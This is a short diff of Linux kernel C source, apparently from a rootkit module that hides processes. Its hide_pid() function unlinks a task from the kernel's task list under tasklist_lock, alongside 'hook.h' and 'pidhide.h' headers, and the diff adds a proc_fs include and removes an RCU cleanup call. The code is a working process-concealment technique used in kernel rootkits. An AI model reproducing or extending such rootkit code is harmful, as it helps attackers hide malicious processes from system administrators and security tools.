@@ -1,6 +1,7 @@
 #include <linux/slab.h>
 #include <linux/pid.h>
 #include <linux/sched.h>
+#include <linux/proc_fs.h>
 
 #include "hook.h"
 #include "pidhide.h"
@@ -79,7 +80,6 @@ hide_pid(pid_t pid)
 	write_lock_irq(&tasklist_lock);
     list_del(&ts->tasks);
     write_unlock_irq(&tasklist_lock);
-    call_rcu(&ts->rcu, delayed_put_task_struct);
 }
 
 void
